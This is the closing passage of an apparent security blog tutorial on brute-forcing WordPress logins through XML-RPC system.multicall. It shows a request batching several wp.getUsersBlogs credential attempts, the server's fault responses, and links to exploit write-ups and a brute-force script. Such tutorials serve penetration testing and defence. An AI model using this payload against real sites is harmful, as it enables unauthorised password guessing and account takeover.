<span class="nt">&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;</span>methodName<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;</span>params<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Username \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;</span>\{\{ Your Password \}\}<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;</span>

<span class="nt">&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</span>
</code></pre></div></div>

<p>The response will look like:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Mon, 01 Jul 2019 23:02:55 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 1043
Content-Type: text/xml; charset=UTF-8

<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;methodResponse&gt;</span>
  <span class="nt">&lt;params&gt;</span>
    <span class="nt">&lt;param&gt;</span>
      <span class="nt">&lt;value&gt;</span>
      <span class="nt">&lt;array&gt;&lt;data&gt;</span>
  <span class="nt">&lt;value&gt;&lt;struct&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultCode<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;int&gt;</span>403<span class="nt">&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultString<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>Incorrect username or password.<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>
<span class="nt">&lt;/struct&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;struct&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultCode<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;int&gt;</span>403<span class="nt">&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultString<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>Incorrect username or password.<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>
<span class="nt">&lt;/struct&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;struct&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultCode<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;int&gt;</span>403<span class="nt">&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultString<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>Incorrect username or password.<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>
<span class="nt">&lt;/struct&gt;&lt;/value&gt;</span>
  <span class="nt">&lt;value&gt;&lt;struct&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultCode<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;int&gt;</span>403<span class="nt">&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;</span>
  <span class="nt">&lt;member&gt;&lt;name&gt;</span>faultString<span class="nt">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>Incorrect username or password.<span class="nt">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>
<span class="nt">&lt;/struct&gt;&lt;/value&gt;</span>
<span class="nt">&lt;/data&gt;&lt;/array&gt;</span>
      <span class="nt">&lt;/value&gt;</span>
    <span class="nt">&lt;/param&gt;</span>
  <span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodResponse&gt;</span>
</code></pre></div></div>
<p>In the above example I tested 4 different credentials sets using a single request. You just have to replace <strong>{{ Your Username }}</strong> and <strong>{{ Your Password }}</strong> with your own combinations.</p>

<p>That is it, please comment if I missed something and happy hunting!</p>

<h3 id="other-references">Other references:</h3>
<ul>
  <li><a href="https://www.wordfence.com/blog/2015/10/should-you-disable-xml-rpc-on-wordpress/">https://www.wordfence.com/blog/2015/10/should-you-disable-xml-rpc-on-wordpress/</a></li>
  <li><a href="https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li>
  <li><a href="https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/blob/master/wordpress-xmlrpc-brute-v2.py">https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/blob/master/wordpress-xmlrpc-brute-v2.py</a></li>
</ul>

  </div>

  <hr>
  
  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <!-- all pages -->
  <ins class="adsbygoogle"
  style="display:block"
  data-ad-client="ca-pub-0255642880549652"
  data-ad-slot="6220756861"
  data-ad-format="auto"
  data-full-width-responsive="true"></ins>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
  </script>


  
  <div class="post-comments" itemprop="comment">
    <hr />
<h1>Comments</h1>
<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://nitesculucian.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

  </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>

      | <a href="/privacy-policy" >Privacy Policy</a>
      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
    </p>

  </div>

</footer>


  </body>

</html>
